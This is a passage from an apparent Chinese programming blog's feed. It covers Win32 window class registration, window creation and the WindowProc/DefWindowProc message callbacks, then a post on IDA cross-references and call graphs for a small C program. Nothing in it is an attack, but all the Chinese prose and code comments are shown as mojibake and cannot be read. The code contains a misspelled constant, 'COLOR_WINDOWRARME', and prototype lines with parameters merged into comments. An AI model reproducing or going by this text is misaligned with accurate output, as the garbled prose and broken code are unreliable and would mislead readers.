é€’è¿›ç¨‹çš„å®ä¾‹å¥æŸ„hInstanceä½œä¸ºå‚æ•°ã€‚</p><p>è¯¥å‡½æ•°å®Œæˆçª—å£ç±»çš„æ³¨å†Œåˆ†ä¸ºä¸¤æ­¥ï¼š</p><ol><li>å¡«å……<strong>WNDCLASSEX</strong>ç»“æ„ä½“ ã€‚è¿™ä¸ªæ­¥éª¤è¾ƒä¸ºå¤æ‚</li><li>è°ƒç”¨<strong>RegisterClassEx</strong>å‡½æ•°è¿›è¡Œæ³¨å†Œ</li></ol><p>ä¸‹é¢ä»£ç ä»‹ç»äº†<strong>WNDCLASSEX</strong>ç»“æ„ä½“çš„æ‰€æœ‰æˆå‘˜ï¼Œå…¶ä¸­æœ€é‡è¦çš„å­—æ®µä¸º<strong>lpfnWndProc</strong>ï¼Œä»–å°†ä¿å­˜çª—å£çš„è¿‡ç¨‹åœ°å€ã€‚çª—å£çš„è¿‡ç¨‹æ˜¯å¯¹å„ç§æ¶ˆæ¯è¿›ç¨‹å¤„ç†çš„**â€æ±‡èšåœ°â€**</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ATOM <span class="title">MyRegisterClass</span><span class="params">(HINSTANCE hInstance)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WNDCLASSEX WndCls;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¡«å……ç»“æ„ä½“ä¸º0</span></span><br><span class="line">ZeroMemory(&amp;WndCls, <span class="keyword">sizeof</span>(WNDCLASSEX));</span><br><span class="line"></span><br><span class="line"><span class="comment">//cbSizeæ˜¯ç»“æ„ä½“å¤§å°</span></span><br><span class="line">WndCls.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//lpfnWndProcæ˜¯çª—å£è¿‡ç¨‹åœ°å€</span></span><br><span class="line">WndCls.lpfnWndProc = WindowProc;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//hInstanceæ˜¯å®ä¾‹å¥æŸ„</span></span><br><span class="line">WndCls.hInstance = hInstance;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//lpszClassNameæ˜¯çª—å£ç±»ç±»å</span></span><br><span class="line">WndCls.lpszClassName = CLASSNAME;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//styleæ˜¯çª—å£ç±»é£æ ¼</span></span><br><span class="line">WndCls.style = <span class="number">0x01</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//hbrBackgroundæ˜¯çª—å£ç±»èƒŒæ™¯è‰²</span></span><br><span class="line">WndCls.hbrBackground = (HBRUSH)COLOR_WINDOWRARME + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//hCursoræ˜¯é¼ æ ‡å¥æŸ„</span></span><br><span class="line">WndCls.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//hIconæ˜¯å›¾æ ‡å¥æŸ„</span></span><br><span class="line">WndCls.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_QUESTION);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//å…¶ä»–</span></span><br><span class="line">WndCls.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">WndCls.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> RegisterClassEx(&amp;WndCls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºä¸»çª—å£å¹¶æ˜¾ç¤ºæ›´æ–°"><a href="#åˆ›å»ºä¸»çª—å£å¹¶æ˜¾ç¤ºæ›´æ–°" class="headerlink" title="åˆ›å»ºä¸»çª—å£å¹¶æ˜¾ç¤ºæ›´æ–°"></a>åˆ›å»ºä¸»çª—å£å¹¶æ˜¾ç¤ºæ›´æ–°</h3><p>æ³¨å†Œçª—å£ç±»åï¼Œæ ¹æ®è¯¥çª—å£ç±»åˆ›å»ºå…·ä½“çš„ä¸»çª—å£å¹¶æ˜¾ç¤ºå’Œæ›´æ–°çª—å£</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºçª—å£å‡½æ•°</span></span><br><span class="line"><span class="function">BOOL <span class="title">InitInstance</span><span class="params">(HINSTANCE hInstance, <span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hWnd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºçª—å£</span></span><br><span class="line">hWnd = CreateWindowEx(WS_EX_CLIENTEDGE,</span><br><span class="line">   <span class="string">&quot;HelloWin32&quot;</span>,</span><br><span class="line">   <span class="string">&quot;MyFirstWindow&quot;</span>,</span><br><span class="line">   WS_OVERLAPPEDWINDOW,</span><br><span class="line">   CW_USEDEFAULT, <span class="comment">//çª—å£å¼¹å‡ºçš„xè½´</span></span><br><span class="line">   CW_USEDEFAULT, <span class="comment">//å¼¹å‡ºçš„yè½´</span></span><br><span class="line">   CW_USEDEFAULT, <span class="comment">//çª—å£å®½</span></span><br><span class="line">   CW_USEDEFAULT, <span class="comment">//çª—å£é«˜</span></span><br><span class="line">   <span class="literal">NULL</span>,  <span class="comment">//çˆ¶çª—å£</span></span><br><span class="line">   <span class="literal">NULL</span>,          <span class="comment">//èœå•çª—å£</span></span><br><span class="line">   hInstance,     <span class="comment">//å½“å‰çª—å£å¥æŸ„</span></span><br><span class="line">   <span class="literal">NULL</span>);        </span><br><span class="line"><span class="keyword">if</span>( <span class="literal">NULL</span> == hWnd )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ˜¾ç¤ºçª—å£</span></span><br><span class="line">ShowWindow(hWnd, nCmdShow);</span><br><span class="line"><span class="comment">//æ›´æ–°çª—å£</span></span><br><span class="line">UpdateWindow(hWnd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨è¯¥å‡½æ•°ï¼Œéœ€è¦ç»™è¯¥å‡½æ•°ä¼ é€’ç¤ºä¾‹å¥æŸ„å’Œçª—å£çš„æ˜¾ç¤ºæ–¹å¼ä¸¤ä¸ªå‚æ•°ã€‚åˆ†åˆ«ä¸ºWinMain()å‡½æ•°çš„ç¬¬1ä¸ªå‚æ•°å’Œç¬¬3ä¸ªå‚æ•°ã€‚</p><p>åˆ›å»ºä¸»çª—å£æ—¶è°ƒç”¨äº†CreateWindowEx()å‡½æ•°ï¼Œé€šè¿‡MSDNæŸ¥å¾—å‡½æ•°åŸå‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HWND <span class="title">CreateWindowEx</span><span class="params">(  DWORD dwExStyle,      <span class="comment">// extended window style</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpClassName,  <span class="comment">// registered class name</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpWindowName, <span class="comment">// window name  DWORD dwStyle,        // window style</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> x,                <span class="comment">// horizontal position of window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> y,                <span class="comment">// vertical position of window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nWidth,           <span class="comment">// window width  int nHeight,          // window height</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HWND hWndParent,      <span class="comment">// handle to parent or owner window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HMENU hMenu,          <span class="comment">// menu handle or child identifier</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HINSTANCE hInstance,  <span class="comment">// handle to application instance</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpParam        <span class="comment">// window-creation data</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>ç¬¬2ä¸ªå‚æ•°æ˜¯<strong>lpClassName</strong>,æ ¹æ®æ³¨é‡Šï¼Œè¯¥å‚æ•°ä¸ºå·²æ³¨å†Œç±»åã€‚è¿™ä¸ªå·²ç»æ³¨å†Œçš„ç±»åå°±æ˜¯<strong>WNDCLASSEX</strong>ç»“æ„ä½“çš„<strong>lpszClassName</strong>å­—æ®µ</p><h3 id="å¤„ç†æ¶ˆæ¯çš„çª—å£è¿‡ç¨‹"><a href="#å¤„ç†æ¶ˆæ¯çš„çª—å£è¿‡ç¨‹" class="headerlink" title="å¤„ç†æ¶ˆæ¯çš„çª—å£è¿‡ç¨‹"></a>å¤„ç†æ¶ˆæ¯çš„çª—å£è¿‡ç¨‹</h3><h4 id="WindowProcå‡½æ•°ä»‹ç»"><a href="#WindowProcå‡½æ•°ä»‹ç»" class="headerlink" title="WindowProcå‡½æ•°ä»‹ç»"></a>WindowProcå‡½æ•°ä»‹ç»</h4><p>çª—å£è¿‡ç¨‹çš„å®šä¹‰æ˜¯æŒ‰ç…§MSDNä¸Šç»™å‡ºçš„å½¢å¼è¿›è¡Œå®šä¹‰çš„ï¼ŒMSDNä¸­çš„å®šä¹‰å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(  HWND hwnd,      <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT uMsg,      <span class="comment">// message identifier</span></span></span></span><br><span class="line"><span class="function"><span class="params">  WPARAM wParam,  <span class="comment">// first message parameter</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPARAM lParam   <span class="comment">// second message parameter);</span></span></span></span><br></pre></td></tr></table></figure><p>WindowProcæ˜¯çª—å£è¿‡ç¨‹çš„å‡½æ•°åï¼Œè¿™ä¸ªå‡½æ•°åå¯ä»¥éšæ„æ”¹å˜ï¼Œä½†æ˜¯çª—å£è¿‡ç¨‹çš„å‡½æ•°åå¿…é¡»ä¸<strong>WNDCLASSEX</strong>ç»“æ„ä½“ä¸­<strong>lpfnWndProc</strong>çš„æˆå‘˜å˜é‡çš„å€¼ä¸€è‡´ã€‚ä¸‹é¢ä»‹ç»å‚æ•°</p><ul><li>å‚æ•°1ï¼šçª—å£å¥æŸ„</li><li>å‚æ•°2ï¼šæ¶ˆæ¯å€¼uMsg</li><li>å‚æ•°3ä¸å‚æ•°4ï¼šè¿™ä¸¤ä¸ªå‚æ•°æ˜¯å¯¹äºæ¶ˆæ¯å€¼çš„é™„åŠ å‚æ•°ï¼Œå…·ä½“ç”¨æ³•éœ€è¦å‚ç…§MSDN</li></ul><p>æ­¤å‡½æ•°ä¹Ÿè¢«ç§°ä¸ºå›è°ƒå‡½æ•°ï¼Œä¸‹é¢ä¸ºæ¶ˆæ¯å›è°ƒå‡½æ•°ä»£ç  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT uMsg,</span></span></span><br><span class="line"><span class="function"><span class="params">WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">HDC hDC;</span><br><span class="line">RECT rt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *pszDrawText = <span class="string">&quot;Hello Windows Program&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">&#123;</span><br><span class="line">hDC = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">GetClientRect(hwnd, &amp;rt);</span><br><span class="line">DrawTextA(hDC,</span><br><span class="line">pszDrawText, <span class="built_in">strlen</span>(pszDrawText),&amp;rt,</span><br><span class="line">DT_CENTER | DT_VCENTER | DT_SINGLELINE);</span><br><span class="line">EndPaint(hwnd, &amp;ps);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(IDYES == MessageBox(hwnd, <span class="string">&quot;æ˜¯å¦é€€å‡ºç¨‹åº&quot;</span>, <span class="string">&quot;MyFirstWin&quot;</span>, MB_YESNO))</span><br><span class="line">&#123;</span><br><span class="line">DestroyWindow(hwnd);</span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="DefWindowProcä»‹ç»"><a href="#DefWindowProcä»‹ç»" class="headerlink" title="DefWindowProcä»‹ç»"></a>DefWindowProcä»‹ç»</h4><p>Windowsçš„æ¶ˆæ¯ç§ç±»æœ‰ä¸Šåƒç§ï¼Œä½†æˆ‘ä»¬åªéœ€è¦å¤„ç†ç¨‹åºéœ€è¦çš„å‡ ç§æ¶ˆæ¯ï¼Œå…¶ä½™çš„éƒ½äº¤ç»™ç³»ç»Ÿå¤„ç†ï¼Œ<strong>DefWindowProc</strong>å‡½æ•°å°±æ˜¯è¿›è¡Œä¸éœ€è¦æ¶ˆæ¯çš„å¤„ç†</p><p>MSDNå¯¹<strong>DefWindowProc</strong>å‡½æ•°çš„å®šä¹‰å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">DefWindowProc</span><span class="params">(  HWND hWnd,      <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT Msg,       <span class="comment">// message identifier</span></span></span></span><br><span class="line"><span class="function"><span class="params">  WPARAM wParam,  <span class="comment">// first message parameter</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPARAM lParam   <span class="comment">// second message parameter);</span></span></span></span><br></pre></td></tr></table></figure><p>è¿™å››ä¸ªå‚æ•°è·Ÿçª—å£è¿‡ç¨‹å‚æ•°ç›¸åŒã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;WIn32çª—å£åº”ç”¨ç¨‹åºä¸»å‡½æ•°-WinMain&quot;&gt;&lt;a href=&quot;#WIn32çª—å£åº”ç”¨ç¨‹åºä¸»å‡½æ•°-WinMain&quot; class=&quot;headerlink&quot; title=&quot;WIn32çª—å£åº”ç”¨ç¨‹åºä¸»å‡½æ•°:WinMain()&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="çº¿ç¨‹" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="ç¼–ç¨‹" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>ğŸ•µï¸â€â™‚ï¸IDAä¸­äº¤å‰å¼•ç”¨å’Œç»˜å›¾åŠŸèƒ½</title>
    <link href="http://example.com/2020/10/28/IDA/IDA%E4%BA%A4%E5%8F%89%E5%BC%95%E7%94%A8%E4%B8%8E%E7%BB%98%E5%9B%BE%E5%8A%9F%E8%83%BD/"/>
    <id>http://example.com/2020/10/28/IDA/IDA%E4%BA%A4%E5%8F%89%E5%BC%95%E7%94%A8%E4%B8%8E%E7%BB%98%E5%9B%BE%E5%8A%9F%E8%83%BD/</id>
    <published>2020-10-28T12:52:10.578Z</published>
    <updated>2021-02-05T06:31:35.501Z</updated>
    
    <content type="html"><![CDATA[<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028204707882.png" alt="" style="zoom: 25%;" /><a id="more"></a><p><strong>æ–‡ç« æ‰€ä½¿ç”¨æºç </strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">depth_2_1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;inside depth_2_1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">depth_2_2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;inside depth_2_2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">depth_1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   depth_2_1();</span><br><span class="line">   depth_2_2();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;inside depth_1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   depth_1();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="äº¤å‰å¼•ç”¨"><a href="#äº¤å‰å¼•ç”¨" class="headerlink" title="äº¤å‰å¼•ç”¨"></a>äº¤å‰å¼•ç”¨</h4><p>äº¤å‰å¼•ç”¨åˆ†ä¸ºä¸¤ç§ç±»å‹</p><ol><li><strong>ä»£ç äº¤å‰å¼•ç”¨</strong></li></ol><ul><li><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028105437882.png"></li></ul><ol start="2"><li><strong>æ•°æ®äº¤å‰å¼•ç”¨</strong></li></ol><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028105538721.png"></p><h4 id="äº¤å‰å¼•ç”¨æºå¤´è§£é‡Š"><a href="#äº¤å‰å¼•ç”¨æºå¤´è§£é‡Š" class="headerlink" title="äº¤å‰å¼•ç”¨æºå¤´è§£é‡Š"></a>äº¤å‰å¼•ç”¨æºå¤´è§£é‡Š</h4><p>äº¤å‰å¼•ç”¨æºå¤´ä¸€å…±æœ‰4ä¸ªéƒ¨åˆ†ç»„æˆ`</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028110418024.png"></p><ul><li><p>ç»„æˆ1ï¼šå¼•ç”¨è€…åå­—</p><p>è¡¨ç¤ºæ˜¯åœ¨<strong>___tmainCRTStartup</strong>çš„å‡½æ•°ä¸­æå‡ºå¼•ç”¨ </p></li><li><p>ç»„æˆ2ï¼šå¼€å§‹å­—èŠ‚</p><p>15Aè¡¨ç¤ºå¼•ç”¨å¼€å§‹æ˜¯åœ¨å‡½æ•°çš„ç¬¬0x15Aä¸ªå­—èŠ‚å¤„</p></li><li><p>ç»„æˆ3ï¼šå¼•ç”¨ä½ç½®ç›¸å¯¹ç›®å‰çš„ä½ç½®</p><p>ç®­å¤´è¡¨ç¤ºå¼•ç”¨ä½ç½®çš„ç›¸å¯¹æ–¹å‘ï¼Œå›¾ä¸­ç®­å¤´å‘ä¸‹ï¼Œè¡¨ç¤ºæ“ä½œè€…éœ€è¦å‘ä¸‹æ»‘åŠ¨æ‰å¯ä»¥çœ‹åˆ°ï¼Œåä¹‹äº¦ç„¶</p></li><li><p>ç»„æˆ4ï¼šè¯†åˆ«åç¼€</p><ul><li>åœ¨IDAä¸­ï¼ŒæŒ‡ä»¤è½¬äº¤æ§åˆ¶æƒçš„æ–¹å¼å«åšæµã€‚IDAä¸­æœ‰3ä¸­åŸºæœ¬æµï¼šæ™®é€šæµï¼Œè·³è½¬æµï¼ŒåŸºæœ¬æµ</li></ul><table><thead><tr><th align="left">ç±»å‹</th><th>è‹±æ–‡åç§°</th></tr></thead><tbody><tr><td align="left">æ™®é€šæµ</td><td>ordinary flow</td></tr><tr><td align="left">è·³è½¬æµ</td><td>jump flow</td></tr><tr><td align="left">è°ƒç”¨æµ</td><td>call flow</td></tr></tbody></table><ul><li>åç¼€æ„ä¹‰</li></ul><table><thead><tr><th>ç¬¦å·</th><th>å¼•ç”¨æ–¹å¼</th><th>å…¨ç§°</th></tr></thead><tbody><tr><td>p</td><td>ä»£ç äº¤å‰å¼•ç”¨</td><td>Procedure</td></tr><tr><td>w</td><td>å†™å…¥äº¤å‰å¼•ç”¨</td><td>write</td></tr><tr><td>r</td><td>è¯»å–äº¤å‰å¼•ç”¨</td><td>read</td></tr><tr><td>o</td><td>åç§»äº¤å‰å¼•ç”¨</td><td>offset(åç§»)</td></tr></tbody></table></li></ul><h4 id="äº¤å‰å¼•ç”¨åˆ—è¡¨"><a href="#äº¤å‰å¼•ç”¨åˆ—è¡¨" class="headerlink" title="äº¤å‰å¼•ç”¨åˆ—è¡¨"></a>äº¤å‰å¼•ç”¨åˆ—è¡¨</h4><p>  å¿«æ·é”®Xï¼Œå¯ä»¥æ˜¾ç¤ºæ‰€æœ‰çš„äº¤å‰å¼•ç”¨æºï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œwrite_itåªè¢«è°ƒç”¨äº†ä¸‰æ¬¡</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028122835393.png"></p><h4 id="å‡½æ•°åˆ—è¡¨"><a href="#å‡½æ•°åˆ—è¡¨" class="headerlink" title="å‡½æ•°åˆ—è¡¨"></a>å‡½æ•°åˆ—è¡¨</h4><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028123515652.png"></p><h4 id="å‡½æ•°å¤–éƒ¨è°ƒç”¨å›¾"><a href="#å‡½æ•°å¤–éƒ¨è°ƒç”¨å›¾" class="headerlink" title="å‡½æ•°å¤–éƒ¨è°ƒç”¨å›¾"></a>å‡½æ•°å¤–éƒ¨è°ƒç”¨å›¾</h4><ul><li>IDAå‡½æ•°è°ƒç”¨å›¾</li></ul><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028124526033.png" alt="" style="zoom:67%;" /><h4 id="å¤–éƒ¨äº¤å‰å¼•ç”¨å›¾"><a href="#å¤–éƒ¨äº¤å‰å¼•ç”¨å›¾" class="headerlink" title="å¤–éƒ¨äº¤å‰å¼•ç”¨å›¾"></a>å¤–éƒ¨äº¤å‰å¼•ç”¨å›¾</h4><p>å¤–éƒ¨äº¤å‰å¼•ç”¨æœ‰ä¸¤ç§ç±»å‹</p><ul><li><strong>ç›®æ ‡ç¬¦å·</strong>äº¤å‰å¼•ç”¨ [Xrefs <strong>To</strong>]</li><li><strong>æºç¬¦å·</strong>äº¤å‰å¼•ç”¨ [Xrefs <strong>From</strong>]</li></ul><h5 id="Xrefs-To"><a href="#Xrefs-To" class="headerlink" title="Xrefs To"></a>Xrefs To</h5><p>â€‹    IDAç”Ÿæˆ<strong>â€œäº¤å‰å¼•ç”¨ç›®æ ‡â€</strong>å›¾å½¢ï¼Œå¿…é¡»æ‰§è¡Œé€’å½’ä¸Šå‡æ“ä½œï¼Œå³å›æº¯æ‰€æœ‰ä»¥é€‰å®šç›®æ ‡çš„ç¬¦å·ä¸ºç›®æ ‡çš„äº¤å‰å¼•ç”¨ï¼Œç›´åˆ°åˆ°è¾¾ä¸€ä¸ªæ²¡æœ‰å…¶ä»–ç¬¦å·å¼•ç”¨çš„ç¬¦å·</p><ul><li>putså‡½æ•°(printfå‡½æ•°)<strong>XrefsToå›¾å½¢</strong>ï¼Œæ˜¾ç¤ºäº†æ‰€æœ‰åˆ°è¾¾putså‡½æ•°çš„è·¯å¾„</li></ul><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028125217629.png" alt="" style="zoom:67%;" /><h5 id="Xrefs-From"><a href="#Xrefs-From" class="headerlink" title="Xrefs From"></a>Xrefs From</h5><p>â€‹                    ç”Ÿæˆ<strong>â€œäº¤å‰å¼•ç”¨æºå¤´â€</strong>å›¾ï¼Œéœ€è¦æ‰§è¡Œé€’å½’ä¸‹é™æ“ä½œï¼Œå³è·Ÿè¸ªæ‰€æœ‰ä»¥é€‰å®šçš„ç¬¦å·ä¸ºæºå¤´çš„äº¤å‰å¼•ç”¨</p><ul><li>mainå‡½æ•°<strong>â€œäº¤å‰å¼•ç”¨æºå¤´å›¾â€</strong></li></ul><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028203719048.png" alt="" style="zoom: 80%;" /><ul><li>depth_1å‡½æ•°<strong>â€œäº¤å‰å¼•ç”¨æºå¤´å›¾â€</strong></li></ul><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028204040474.png" alt="" style="zoom:67%;" /><h5 id="ç®€å•ç†è§£"><a href="#ç®€å•ç†è§£" class="headerlink" title="ç®€å•ç†è§£"></a>ç®€å•ç†è§£</h5><ul><li><p>Toè¡¨ç¤ºæºå¤´ï¼ŒIDAå¯ä»¥é€’å½’å‡ºæ‰€æœ‰åˆ°è¾¾è¯¥æºå¤´çš„è·¯å¾„</p></li><li><p>Fromè¡¨ç¤ºç›®æ ‡ï¼ŒIDAä»é€‰å®šå¤„æºå¤´å¼€å§‹é€’å½’ï¼Œæ‰¾åˆ°ä»ä»æºå¤´å¼€å§‹çš„æ‰€æœ‰è·¯å¾„</p></li></ul><p>å¯¹IDAæ¥è¯´æ¥è¯´Toå°±æ˜¯IDAä»ç›®æ ‡å¤„å‘ä¸Šé€’å½’ï¼ŒFromå°±æ˜¯IDAä»ç›®æ ‡å¤„å‘ä¸‹é€’å½’</p>]]></content>
    
    
